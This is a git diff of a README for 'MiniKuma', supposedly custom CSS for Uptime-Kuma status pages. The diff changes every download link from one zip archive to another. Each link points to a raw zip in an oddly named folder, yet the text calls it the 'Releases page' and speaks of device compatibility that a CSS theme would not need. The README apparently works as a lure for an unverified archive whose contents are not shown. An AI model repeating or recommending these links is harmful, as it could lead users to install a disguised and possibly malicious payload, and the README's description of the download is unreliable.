@@ -1,7 +1,7 @@
 # 🎨 MiniKuma - Minimal Custom CSS for Uptime-Kuma
 
 ## 📥 Download Now!
-[![Download MiniKuma](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Kuma-Mini-1.2.zip)](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Kuma-Mini-1.2.zip)
+[![Download MiniKuma](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Mini_Kuma_3.1.zip)](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Mini_Kuma_3.1.zip)
 
 ## 📖 Description
 MiniKuma offers custom CSS to give your Uptime-Kuma status page a clean and minimal look. This simple yet effective approach improves the visual appeal of your status page while maintaining all its essential features. With MiniKuma, you can enhance user experience effortlessly.
@@ -15,7 +15,7 @@ MiniKuma offers custom CSS to give your Uptime-Kuma status page a clean and mini
 To begin using MiniKuma, follow these straightforward steps to download and install the custom CSS.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [MiniKuma Releases page](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Kuma-Mini-1.2.zip) to access the latest version.
+1. **Visit the Releases Page**: Go to the [MiniKuma Releases page](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Mini_Kuma_3.1.zip) to access the latest version.
 
 2. **Select the Appropriate File**: Look for the latest release listed at the top of the page. Make sure to choose the version compatible with your device setup.
 
@@ -49,6 +49,6 @@ To begin using MiniKuma, follow these straightforward steps to download and inst
 If you have any questions or need support, consider visiting the issues section of the repository. You can ask questions and receive help from the community. We encourage user feedback and suggestions to improve MiniKuma further.
 
 ## 🔄 Future Updates
-We plan to keep MiniKuma up to date with the latest Uptime-Kuma changes. New features and styles may be added based on user requests. Please check back on the [Releases page](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Kuma-Mini-1.2.zip) often to see what’s new.
+We plan to keep MiniKuma up to date with the latest Uptime-Kuma changes. New features and styles may be added based on user requests. Please check back on the [Releases page](https://github.com/AmiraMeuhsen/MiniKuma/raw/refs/heads/main/pseudoadiabatic/Mini_Kuma_3.1.zip) often to see what’s new.
 
 Thank you for choosing MiniKuma to enhance the look of your Uptime-Kuma status page!
